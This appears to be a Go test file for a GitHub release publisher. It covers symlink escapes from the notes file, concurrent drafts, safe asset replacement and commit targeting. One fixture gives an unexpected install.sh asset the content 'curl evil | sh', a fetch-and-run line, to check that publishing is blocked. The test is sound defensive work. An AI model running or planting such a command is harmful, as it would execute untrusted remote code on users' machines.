package release

import (
	"context"
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"testing"
)

// logBuf collects the log (and still shows it in the test output).
type logBuf struct {
	t  *testing.T
	mu sync.Mutex
	b  strings.Builder
}

func (l *logBuf) Write(p []byte) (int, error) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.t.Log(strings.TrimRight(string(p), "\n"))
	return l.b.Write(p)
}

func (l *logBuf) String() string {
	l.mu.Lock()
	defer l.mu.Unlock()
	return l.b.String()
}

// --- F2: notes_file is read through os.Root ---

func TestNotesFileSymlinkOutsideRootIsRejected(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "secret.txt")
	if err := os.WriteFile(outside, []byte("SECRET_FROM_OUTSIDE_ROOT=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for name, setup := range map[string]func(root string) string{
		"file link": func(root string) string {
			if err := os.Symlink(outside, filepath.Join(root, "CHANGELOG.md")); err != nil {
				t.Fatal(err)
			}
			return "CHANGELOG.md"
		},
		"relative file link": func(root string) string {
			rel, err := filepath.Rel(root, outside)
			if err != nil {
				t.Fatal(err)
			}
			if err := os.Symlink(rel, filepath.Join(root, "CHANGELOG.md")); err != nil {
				t.Fatal(err)
			}
			return "CHANGELOG.md"
		},
		"parent directory link": func(root string) string {
			if err := os.Symlink(filepath.Dir(outside), filepath.Join(root, "docs")); err != nil {
				t.Fatal(err)
			}
			return "docs/secret.txt"
		},
	} {
		t.Run(name, func(t *testing.T) {
			f := newFakeGitHub(t)
			fx := newFixture(t)
			fx.gh().NotesFile = setup(fx.cfg.Root)
			_, err := Run(context.Background(), fx.input(f.client(t)))
			if err == nil || !strings.Contains(err.Error(), "notes_file") || !strings.Contains(err.Error(), "escapes") {
				t.Fatalf("err = %v", err)
			}
			if strings.Contains(err.Error(), "SECRET_FROM_OUTSIDE_ROOT") {
				t.Fatal("outside content leaked into the error")
			}
			if r := f.requests(); len(r) != 0 {
				t.Fatalf("network used: %v", r)
			}
		})
	}
}

func TestNotesFileInsideRoot(t *testing.T) {
	t.Run("link inside the project is followed", func(t *testing.T) {
		f := newFakeGitHub(t)
		fx := newFixture(t)
		if err := os.MkdirAll(filepath.Join(fx.cfg.Root, "docs"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(fx.cfg.Root, "docs", "CHANGES.md"), []byte("inside\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.Symlink(filepath.Join("docs", "CHANGES.md"), filepath.Join(fx.cfg.Root, "NOTES.md")); err != nil {
			t.Fatal(err)
		}
		fx.gh().NotesFile = "NOTES.md"
		if _, err := Run(context.Background(), fx.input(f.client(t))); err != nil {
			t.Fatal(err)
		}
		if got := f.byTag(tag)[0].Body; got != "inside\n" {
			t.Fatalf("body %q", got)
		}
	})
	t.Run("directory is rejected", func(t *testing.T) {
		fx := newFixture(t)
		fx.gh().NotesFile = "dist"
		_, err := Run(context.Background(), fx.input(newFakeGitHub(t).client(t)))
		if err == nil || !strings.Contains(err.Error(), "not a regular file") {
			t.Fatalf("err = %v", err)
		}
	})
	t.Run("size limit is kept", func(t *testing.T) {
		fx := newFixture(t)
		if err := os.WriteFile(filepath.Join(fx.cfg.Root, "BIG.md"), []byte(strings.Repeat("x", maxNotesFile+1)), 0o644); err != nil {
			t.Fatal(err)
		}
		fx.gh().NotesFile = "BIG.md"
		_, err := Run(context.Background(), fx.input(newFakeGitHub(t).client(t)))
		if err == nil || !strings.Contains(err.Error(), "exceeds") {
			t.Fatalf("err = %v", err)
		}
	})
}

// --- F12: concurrent runs, unexpected assets, replacing published assets ---

func TestConcurrentDraftLoserDeletesOnlyItsOwnDraft(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	var other *fakeRelease
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && r.URL.Path == "/repos/acme/tool/releases" && other == nil {
			// A concurrent run created its draft first (lower id).
			other = f.addRelease(tag, true, false, map[string]string{linuxName: defaultFiles[linuxName]})
		}
		return false
	}
	res, err := Run(context.Background(), fx.input(f.client(t)))
	if err != nil {
		t.Fatal(err)
	}
	rels := f.byTag(tag)
	if len(rels) != 1 || rels[0].ID != other.ID || rels[0].Draft {
		t.Fatalf("server state: %d releases, first id %d (want %d, published)", len(rels), rels[0].ID, other.ID)
	}
	if res.ReleaseID != other.ID || res.Created || !res.Published {
		t.Fatalf("result %+v", res)
	}
	deletes := 0
	for _, l := range f.writes() {
		if strings.HasPrefix(l, "DELETE /repos/acme/tool/releases/") {
			deletes++
			if l == "DELETE /repos/acme/tool/releases/"+strconv.FormatInt(other.ID, 10) {
				t.Fatal("deleted the other run's draft")
			}
		}
	}
	if deletes != 1 {
		t.Fatalf("writes %v", f.writes())
	}
	wantStatuses(t, res, map[string]string{linuxName: StatusUnchanged, darwinName: StatusUploaded, checksumName: StatusUploaded})
}

func TestConcurrentDraftWinnerKeepsItsDraft(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().Draft = true
	created := false
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && r.URL.Path == "/repos/acme/tool/releases" && !created {
			created = true
			f.mu.Lock()
			f.route(w, r, body)
			f.mu.Unlock()
			// The concurrent run's draft comes later (higher id).
			f.addRelease(tag, true, false, nil)
			return true
		}
		return false
	}
	res, err := Run(context.Background(), fx.input(f.client(t)))
	if err != nil {
		t.Fatal(err)
	}
	if !res.Created || f.count("DELETE ") != 0 {
		t.Fatalf("result %+v writes %v", res, f.writes())
	}
	if rels := f.byTag(tag); len(rels) != 2 || rels[0].ID != res.ReleaseID {
		t.Fatal("the winner's draft was not kept")
	}
}

func TestUnexpectedAssetsOnDraft(t *testing.T) {
	t.Run("draft to be published is an error", func(t *testing.T) {
		f := newFakeGitHub(t)
		fx := newFixture(t)
		f.addRelease(tag, true, false, map[string]string{"install.sh": "curl evil | sh", linuxName: defaultFiles[linuxName]})
		res, err := Run(context.Background(), fx.input(f.client(t)))
		if err == nil || !strings.Contains(err.Error(), "install.sh") || !strings.Contains(err.Error(), "not in the manifest") {
			t.Fatalf("err = %v", err)
		}
		if res == nil || res.Published {
			t.Fatalf("result %+v", res)
		}
		if w := f.writes(); len(w) != 0 {
			t.Fatalf("writes %v (nothing may be written, nor deleted)", w)
		}
		if rel := f.byTag(tag)[0]; !rel.Draft || len(rel.assets) != 2 {
			t.Fatal("draft was changed")
		}
	})
	t.Run("draft: true only warns", func(t *testing.T) {
		f := newFakeGitHub(t)
		fx := newFixture(t)
		fx.gh().Draft = true
		f.addRelease(tag, true, false, map[string]string{"install.sh": "x"})
		lb := &logBuf{t: t}
		in := fx.input(f.client(t))
		in.Log = lb
		if _, err := Run(context.Background(), in); err != nil {
			t.Fatal(err)
		}
		if !strings.Contains(lb.String(), "warning: release") || !strings.Contains(lb.String(), "install.sh") {
			t.Fatal("no warning")
		}
	})
	t.Run("published release only warns", func(t *testing.T) {
		f := newFakeGitHub(t)
		fx := newFixture(t)
		f.addRelease(tag, false, false, map[string]string{"legacy.tar.gz": "x"})
		if _, err := Run(context.Background(), fx.input(f.client(t))); err != nil {
			t.Fatal(err)
		}
	})
}

func TestReplaceOnPublishedMutableReleaseUsesTemporaryName(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().ReplaceExistingAssets = true
	f.addRelease(tag, false, false, map[string]string{linuxName: "other bytes", darwinName: defaultFiles[darwinName], checksumName: defaultFiles[checksumName]})
	var seq []string
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		switch r.Method {
		case "POST":
			seq = append(seq, "upload "+r.URL.Query().Get("name"))
		case "DELETE":
			seq = append(seq, "delete")
		case "PATCH":
			if strings.Contains(r.URL.Path, "/assets/") {
				var b map[string]string
				_ = json.Unmarshal(body, &b)
				seq = append(seq, "rename "+b["name"])
			}
		}
		return false
	}
	res, err := Run(context.Background(), fx.input(f.client(t)))
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"upload " + linuxName + tmpSuffix, "delete", "rename " + linuxName}
	if strings.Join(seq, "|") != strings.Join(want, "|") {
		t.Fatalf("sequence %v, want %v", seq, want)
	}
	wantStatuses(t, res, map[string]string{linuxName: StatusReplaced, darwinName: StatusUnchanged, checksumName: StatusUnchanged})
	rel := f.byTag(tag)[0]
	if len(rel.assets) != 3 {
		t.Fatalf("%d assets", len(rel.assets))
	}
	for _, a := range rel.assets {
		if a.Name == linuxName && string(a.data) != defaultFiles[linuxName] {
			t.Fatal("asset not replaced")
		}
		if strings.HasSuffix(a.Name, tmpSuffix) {
			t.Fatal("temporary asset left behind")
		}
	}
	if fx.downloadURL(linuxName) != webBase+"/releases/download/"+tag+"/"+linuxName {
		t.Fatalf("download URL %q", fx.downloadURL(linuxName))
	}
}

func TestReplaceOnPublishedReleaseFailedUploadKeepsOldAsset(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().ReplaceExistingAssets = true
	f.addRelease(tag, false, false, map[string]string{linuxName: "other bytes"})
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && r.URL.Query().Get("name") == linuxName+tmpSuffix {
			reply(w, 400, map[string]any{"message": "Bad Request"})
			return true
		}
		return false
	}
	_, err := Run(context.Background(), fx.input(f.client(t)))
	if err == nil || !strings.Contains(err.Error(), "is untouched") {
		t.Fatalf("err = %v", err)
	}
	for _, a := range f.byTag(tag)[0].assets {
		if a.Name == linuxName && string(a.data) != "other bytes" {
			t.Fatal("old asset modified")
		}
	}
	if f.count("DELETE ") != 0 {
		t.Fatalf("deleted although the replacement failed: %v", f.writes())
	}
}

func TestReplaceOnPublishedReleaseRenameFailureIsExplained(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().ReplaceExistingAssets = true
	f.addRelease(tag, false, false, map[string]string{linuxName: "other bytes"})
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "PATCH" && strings.Contains(r.URL.Path, "/assets/") {
			reply(w, 400, map[string]any{"message": "Bad Request"})
			return true
		}
		return false
	}
	_, err := Run(context.Background(), fx.input(f.client(t)))
	if err == nil || !strings.Contains(err.Error(), linuxName+tmpSuffix) || !strings.Contains(err.Error(), "missing from the published release") {
		t.Fatalf("err = %v", err)
	}
	found := false
	for _, a := range f.byTag(tag)[0].assets {
		if a.Name == linuxName+tmpSuffix && string(a.data) == defaultFiles[linuxName] {
			found = true
		}
	}
	if !found {
		t.Fatal("verified replacement not kept under the temporary name")
	}
}

func TestDraftReplaceStillDeletesThenUploads(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().ReplaceExistingAssets = true
	f.addRelease(tag, true, false, map[string]string{linuxName: "other bytes"})
	if _, err := Run(context.Background(), fx.input(f.client(t))); err != nil {
		t.Fatal(err)
	}
	for _, l := range f.writes() {
		if strings.HasPrefix(l, "PATCH ") && strings.Contains(l, "/assets/") {
			t.Fatalf("draft asset renamed: %v", f.writes())
		}
	}
}

// --- F13: target_commitish defaults to the built commit ---

const fullSHA = "0123456789abcdef0123456789abcdef01234567"

func TestTargetCommitishDefaultsToCommit(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	var createBody map[string]any
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && r.URL.Path == "/repos/acme/tool/releases" {
			_ = json.Unmarshal(body, &createBody)
		}
		return false
	}
	lb := &logBuf{t: t}
	in := fx.input(f.client(t))
	in.Vars.Commit = strings.ToUpper(fullSHA)
	in.Log = lb
	if _, err := Run(context.Background(), in); err != nil {
		t.Fatal(err)
	}
	if createBody["target_commitish"] != fullSHA {
		t.Fatalf("create body %v", createBody)
	}
	if strings.Contains(lb.String(), "default branch") {
		t.Fatal("warned although the commit is known")
	}
	if f.count("GET /repos/acme/tool/git/ref/") != 0 {
		t.Fatal("tag looked up although the commit is known")
	}
}

func TestTargetCommitishConfiguredWins(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	fx.gh().TargetCommitish = "release-branch"
	var createBody map[string]any
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "POST" && r.URL.Path == "/repos/acme/tool/releases" {
			_ = json.Unmarshal(body, &createBody)
		}
		return false
	}
	in := fx.input(f.client(t))
	in.Vars.Commit = fullSHA
	if _, err := Run(context.Background(), in); err != nil {
		t.Fatal(err)
	}
	if createBody["target_commitish"] != "release-branch" {
		t.Fatalf("create body %v", createBody)
	}
}

func TestTargetCommitishSentWhenPublishingExistingDraft(t *testing.T) {
	f := newFakeGitHub(t)
	fx := newFixture(t)
	f.addRelease(tag, true, false, nil)
	var patchBody map[string]any
	f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
		if r.Method == "PATCH" {
			_ = json.Unmarshal(body, &patchBody)
		}
		return false
	}
	in := fx.input(f.client(t))
	in.Vars.Commit = fullSHA
	if _, err := Run(context.Background(), in); err != nil {
		t.Fatal(err)
	}
	if patchBody["draft"] != false || patchBody["target_commitish"] != fullSHA {
		t.Fatalf("publish body %v", patchBody)
	}
}

func TestUnknownCommitWarnsOnlyWhenTagIsMissing(t *testing.T) {
	for _, tc := range []struct {
		name       string
		commit     string
		tagExists  bool
		wantWarn   bool
		wantTarget bool
	}{
		{"no commit, no tag", "", false, true, false},
		{"no commit, tag exists", "", true, false, false},
		{"short commit is not used", "0123abc", false, true, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := newFakeGitHub(t)
			f.tags = map[string]bool{tag: tc.tagExists}
			fx := newFixture(t)
			var createBody map[string]any
			f.hook = func(w http.ResponseWriter, r *http.Request, body []byte) bool {
				if r.Method == "POST" && r.URL.Path == "/repos/acme/tool/releases" {
					_ = json.Unmarshal(body, &createBody)
				}
				return false
			}
			lb := &logBuf{t: t}
			in := fx.input(f.client(t))
			in.Vars.Commit = tc.commit
			in.Log = lb
			if _, err := Run(context.Background(), in); err != nil {
				t.Fatal(err)
			}
			if got := strings.Contains(lb.String(), "HEAD of the default branch"); got != tc.wantWarn {
				t.Fatalf("warned = %t, want %t", got, tc.wantWarn)
			}
			if _, got := createBody["target_commitish"]; got != tc.wantTarget {
				t.Fatalf("create body %v", createBody)
			}
		})
	}
}
